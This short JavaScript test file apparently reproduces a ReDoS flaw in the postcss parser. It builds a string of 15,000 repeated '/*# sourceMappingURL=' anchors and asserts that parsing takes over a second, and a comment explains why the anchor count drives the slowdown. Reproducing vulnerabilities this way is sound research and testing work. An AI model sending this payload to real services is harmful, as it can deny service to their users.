// A single `/*# sourceMappingURL=` followed by padding is linear against the
// regex patch.txt reverts (`/\/\*\s*# sourceMappingURL=.*\*\//gm`): there is
// only one `/*` to anchor at, so the whole scan costs ~0.1ms. The blow-up is in
// the number of ANCHORS, not the padding length -- that payload was written for
// postcss 7.x, whose regex was `(.*)\s*\*\/`.
function build_attack(n) {
  return "/*# sourceMappingURL=".repeat(n);
}
test(
  "ReDos in postcss",
  () => {
    const genstr = require("../utils").genstr;
    const measureTime = require("../utils").measureTime;
    const postcss = require("postcss");
    let attack_str = build_attack(15000);
    let t = measureTime(function () {
      try {
        postcss.parse(attack_str);
      } catch (e) {}
    });
    let time = t[0] + t[1] / 1000000000;
    expect(time).toBeGreaterThan(1);
  },
  60000
);
